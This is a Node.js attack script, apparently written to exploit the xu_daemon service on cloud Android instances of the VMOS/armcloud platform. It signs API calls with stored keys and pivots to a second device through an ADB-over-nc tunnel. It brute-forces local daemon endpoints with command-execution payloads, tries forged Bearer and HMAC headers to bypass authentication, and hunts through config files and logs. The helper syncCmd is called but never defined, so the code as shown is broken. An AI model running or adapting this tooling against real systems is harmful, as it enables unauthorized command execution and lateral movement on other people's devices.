#!/usr/bin/env node
/**
 * Find xu_daemon correct API paths on D1 (no auth), then exploit on .220
 */
const net = require('net');
const https = require('https');
const crypto = require('crypto');

const { AK, SK, HOST, D1, CT, SHD } = require('../shared/vmos_api');
const SRC_IP = '10.0.26.220';

function sign(b) {
  const xd = new Date().toISOString().replace(/[-:]/g, '').replace(/\.\d{3}Z$/, 'Z');
  const sd = xd.slice(0, 8), CT = 'application/json;charset=UTF-8', SHD = 'content-type;host;x-content-sha256;x-date';
  const bh = crypto.createHash('sha256').update(b, 'utf8').digest('hex');
  const can = `host:${HOST}\nx-date:${xd}\ncontent-type:${CT}\nsignedHeaders:${SHD}\nx-content-sha256:${bh}`;
  const ch = crypto.createHash('sha256').update(can, 'utf8').digest('hex');
  const sts = `HMAC-SHA256\n${xd}\n${sd}/armcloud-paas/request\n${ch}`;
  let k = crypto.createHmac('sha256', SK).update(sd).digest();
  k = crypto.createHmac('sha256', k).update('armcloud-paas').digest();
  k = crypto.createHmac('sha256', k).update('request').digest();
  return { 'content-type': CT, 'x-date': xd, 'x-host': HOST, 'authorization': `HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256', k).update(sts).digest('hex')}` };
}
function apiPost(ep, d, t) {
  return new Promise(ok => {
    const b = JSON.stringify(d || {}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({ hostname: HOST, path: ep, method: 'POST', headers: { ...h, 'content-length': buf.length }, timeout: (t || 60) * 1000 }, res => {
      let r = ''; res.on('data', c => r += c); res.on('end', () => { try { ok(JSON.parse(r)); } catch { ok({ code: -1 }); } });
    });
    req.on('timeout', () => { req.destroy(); ok({ code: -99 }); });
    req.on('error', e => ok({ code: -99, msg: e.message }));
    req.write(buf); req.end();
  });
}

// ADB stream to .220
const A_CNXN=0x4e584e43,A_OPEN=0x4e45504f,A_OKAY=0x59414b4f,A_WRTE=0x45545257,A_CLSE=0x45534c43;
function makeHeader(cmd,a0,a1,dl,dc){const h=Buffer.alloc(24);h.writeUInt32LE(cmd,0);h.writeUInt32LE(a0,4);h.writeUInt32LE(a1,8);h.writeUInt32LE(dl,12);h.writeUInt32LE(dc,16);h.writeUInt32LE((cmd^0xFFFFFFFF)>>>0,20);return h;}
function crc(d){let s=0;for(let i=0;i<d.length;i++)s+=d[i];return s>>>0;}
function makeCnxn(){const p=Buffer.from('host::\x00');return Buffer.concat([makeHeader(A_CNXN,0x01000000,256*1024,p.length,crc(p)),p]);}
function makeOpen(lid,svc){const p=Buffer.from(svc+'\x00');return Buffer.concat([makeHeader(A_OPEN,lid,0,p.length,crc(p)),p]);}
function makeOkay(lid,rid){return makeHeader(A_OKAY,lid,rid,0,0);}
function parsePackets(buf){const pkts=[];let o=0;while(o+24<=buf.length){const cmd=buf.readUInt32LE(o),a0=buf.readUInt32LE(o+4),a1=buf.readUInt32LE(o+8),dl=buf.readUInt32LE(o+12);if(o+24+dl>buf.length)break;pkts.push({cmd,arg0:a0,arg1:a1,data:buf.slice(o+24,o+24+dl)});o+=24+dl;}return{packets:pkts,remaining:buf.slice(o)};}

function adbExec220(cmd, sec) {
  return new Promise(resolve => {
    let trid=null,srid=null,sc=false,done=false,res=Buffer.alloc(0),buf=Buffer.alloc(0),tb=Buffer.alloc(0);
    const sock=net.createConnection(8479,'127.0.0.1',()=>sock.write(makeCnxn()));
    const fin=()=>{if(done)return;done=true;clearTimeout(t);try{sock.destroy();}catch(e){}resolve(res.toString());};
    const t=setTimeout(fin,(sec||30)*1000);
    sock.on('data',chunk=>{buf=Buffer.concat([buf,chunk]);const{packets:pp,remaining:r}=parsePackets(buf);buf=r;
    for(const p of pp){if(p.cmd===A_CNXN&&!trid)sock.write(makeOpen(1,`exec:nc ${SRC_IP} 5555`));
    else if(p.cmd===A_OKAY&&p.arg1===1&&!trid){trid=p.arg0;setTimeout(()=>{const c=makeCnxn();sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,c.length,crc(c)),c]));},500);}
    else if(p.cmd===A_WRTE&&p.arg1===1){sock.write(makeOkay(1,trid));tb=Buffer.concat([tb,p.data]);const inner=parsePackets(tb);tb=inner.remaining;
    for(const ip of inner.packets){if(ip.cmd===A_CNXN&&!sc){sc=true;const q=Buffer.from('shell:'+cmd+'\x00');const op=Buffer.concat([makeHeader(A_OPEN,100,0,q.length,crc(q)),q]);sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,op.length,crc(op)),op]));}
    else if(ip.cmd===A_OKAY&&ip.arg1===100)srid=ip.arg0;
    else if(ip.cmd===A_WRTE&&ip.arg1===100){res=Buffer.concat([res,ip.data]);const ok=makeOkay(100,srid);sock.write(Buffer.concat([makeHeader(A_WRTE,1,trid,ok.length,crc(ok)),ok]));}
    else if(ip.cmd===A_CLSE)fin();}}else if(p.cmd===A_CLSE)fin();}});
    sock.on('error',fin);sock.on('close',fin);
  });
}

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);

async function main() {
  // STEP 1: Extract xu_daemon strings from D1 (we have root)
  log('=== D1: xu_daemon binary strings (URL paths) ===');
  const strs = await syncCmd(D1, 'strings /system/bin/xu_daemon 2>/dev/null | grep -iE "^/[a-z]|url|path|route|cmd|exec|script|api" | sort -u | head -50', 20);
  log(strs);

  // STEP 2: Try all paths found
  log('\n=== D1: Try extracted paths on port 8779 ===');
  const paths = strs.split('\n').filter(l => l.startsWith('/')).map(l => l.trim());
  for (const p of paths.slice(0, 20)) {
    const r = await syncCmd(D1, `curl -s -X POST -H "Content-Type: application/json" -d '{"scriptContent":"id"}' "http://127.0.0.1:8779${p}" 2>&1 | head -3`, 8);
    if (!r.includes('unknown url') && r.length > 3) {
      log(`  ★ ${p}: ${r.slice(0, 200)}`);
    }
  }

  // STEP 3: Try common API patterns on D1 port 8779
  log('\n=== D1: Brute force paths on 8779 ===');
  const bruteForce = [
    '/xu/cmd', '/xu/exec', '/xu/shell', '/xu/sync',
    '/device/cmd', '/device/exec', '/device/shell',
    '/armcloud/cmd', '/armcloud/exec',
    '/api/cmd', '/api/exec', '/api/shell', '/api/sync',
    '/v1/cmd', '/v1/exec', '/v1/shell',
    '/script/run', '/script/exec',
    '/task/run', '/task/create',
    '/pad/cmd', '/pad/syncCmd', '/pad/asyncCmd',
  ];
  for (const p of bruteForce) {
    const r = await syncCmd(D1, `curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d '{"scriptContent":"id"}' "http://127.0.0.1:8779${p}" 2>&1`, 5);
    if (r !== '200' || true) {  // Log everything for now
      // Get body too for non-"unknown url" responses
      const body = await syncCmd(D1, `curl -s -X POST -H "Content-Type: application/json" -d '{"scriptContent":"id"}' "http://127.0.0.1:8779${p}" 2>&1`, 5);
      if (!body.includes('unknown url')) {
        log(`  ★ ${p} [${r}]: ${body.slice(0, 200)}`);
      }
    }
  }

  // STEP 4: Try on .220 port 19090 with POST (which didn't return 401)
  log('\n=== .220: POST probing on 19090 ===');
  // Try with explicit Content-Type and various bodies
  const r1 = await adbExec220('curl -s -X POST -H "Content-Type: application/json" -d \'{"scriptContent":"id"}\' http://127.0.0.1:19090/ 2>&1', 10);
  log('POST / json: ' + r1.slice(0, 300));

  // Try PUT, PATCH, OPTIONS
  const r2 = await adbExec220('curl -s -X OPTIONS http://127.0.0.1:19090/ 2>&1 | head -5', 10);
  log('OPTIONS /: ' + r2.slice(0, 200));

  // Try with Authorization header (Bearer token, Basic auth)
  const r3 = await adbExec220('curl -s -H "Authorization: Bearer test" http://127.0.0.1:19090/ 2>&1', 10);
  log('Bearer auth: ' + r3.slice(0, 200));

  // STEP 5: Check if .220 has same xu_daemon port as D1
  // D1 has 8779, .220 has 19090 - different ports, same binary
  // Maybe there's a config file
  log('\n=== .220: xu_daemon config files ===');
  const cfg = await adbExec220('find /data /system /etc -name "*.conf" -o -name "*.cfg" -o -name "*.json" -o -name "*.toml" 2>/dev/null | xargs grep -l "xu_daemon\\|19090\\|8779" 2>/dev/null | head -10', 15);
  log('Config: ' + cfg);

  // Check /data/local/tmp for xu_daemon related files
  const tmp = await adbExec220('ls -la /data/local/tmp/ 2>/dev/null; cat /data/local/tmp/proxy.log 2>/dev/null | head -10', 10);
  log('tmp: ' + tmp);

  // STEP 6: Try connecting directly to xu_daemon with the VMOS cloud API auth
  log('\n=== .220: Try VMOS API auth on local port ===');
  // The VMOS API uses HMAC-SHA256 - maybe xu_daemon accepts the same auth
  const authHeader = `HMAC-SHA256 Credential=${AK}, SignedHeaders=content-type;host;x-content-sha256;x-date, Signature=test`;
  const r4 = await adbExec220(`curl -s -X POST -H "Content-Type: application/json" -H "Authorization: ${authHeader}" -d '{"scriptContent":"id"}' http://127.0.0.1:19090/ 2>&1`, 10);
  log('VMOS auth: ' + r4.slice(0, 300));
}

main().catch(e => console.error('FATAL:', e));
